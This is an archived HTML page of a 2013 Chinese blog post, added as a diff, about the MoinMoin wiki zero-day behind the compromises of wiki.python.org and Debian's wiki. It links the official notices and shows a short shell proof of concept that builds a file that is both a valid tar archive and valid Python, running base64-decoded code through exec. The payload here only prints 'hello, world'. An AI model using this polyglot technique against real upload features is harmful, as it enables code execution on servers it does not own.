@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>moin moin wiki的0day，日了python.org,再日debian.org。</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+
+        <!--[if IE]>
+            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Est's Blog </a></h1>
+                <nav><ul>
+                    <li><a href="/category/photo.html">photo</a></li>
+                    <li><a href="/category/stderr.html">stderr</a></li>
+                    <li><a href="/category/stdin.html">stdin</a></li>
+                    <li class="active"><a href="/category/text.html">text</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/post/40066246146" rel="bookmark"
+           title="Permalink to moin moin wiki的0day，日了python.org,再日debian.org。">moin moin wiki的0day，日了python.org,再日debian.org。</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2013-01-08T22:26:00+00:00">
+                Published: Tue 08 January 2013
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/estblog.html">estblog</a>
+        </address>
+<p>In <a href="/category/text.html">text</a>.</p>
+<p>tags: <a href="/tag/security.html">security</a> <a href="/tag/python.html">python</a> <a href="/tag/wiki.html">wiki</a> <a href="/tag/0day.html">0day</a> </p>
+</footer><!-- /.post-info -->      <p>Python声明</p>
+<p>http://pyfound.blogspot.com/2013/01/wikipythonorg-compromised.html</p>
+<p>Debian声明</p>
+<p>http://lists.debian.org/debian-devel-announce/2013/01/msg00000.html</p>
+<div class="highlight"><pre><span></span>$ touch <span class="s2">&quot;exec __import__(&#39;base64&#39;).b64decode(&#39;cHJpbnQgImhlbGxvLCB3b3JsZCI=&#39;)&quot;</span>            
+$ tar cf result.py !$
+tar cf result.py <span class="s2">&quot;exec __import__(&#39;base64&#39;).b64decode(&#39;cHJpbnQgImhlbGxvLCB3b3JsZCI=&#39;)&quot;</span>
+$ python result.py 
+hello, world
+$ tar xvf result.py
+x <span class="nb">exec</span> __import__<span class="o">(</span><span class="s1">&#39;base64&#39;</span><span class="o">)</span>.b64decode<span class="o">(</span><span class="s1">&#39;cHJpbnQgImhlbGxvLCB3b3JsZCI=&#39;</span><span class="o">)</span>
+$
+</pre></div>
+
+
+<p>这个是0day的PoC。。。。</p>
+<p>简单的说，就是一个上传，既是合法的tar文件，又是合法的python代码。omg碉堡了。</p>
+<p>今天Ruby on Rails也被日了。</p>
+<p>什么时候来日django？</p>
+<p>via <a href="http://www.reddit.com/r/Python/comments/166mi3/announcement_wikipythonorg_compromised/">1</a>, <a href="http://www.reddit.com/r/netsec/comments/164pa7/debian_wiki_servers_compromised_using_0day_in/">2</a>, <a href="http://www.reddit.com/r/netsec/comments/1679t8/wikipythonorg_compromised/">3</a></p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>links</h2>
+                        <ul>
+                            <li><a href="http://getpelican.com/">Pelican</a></li>
+                            <li><a href="http://python.org/">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
+                            <li><a href="#">You can modify those links in your config file</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="#">You can add links in your config file</a></li>
+                            <li><a href="#">Another social link</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
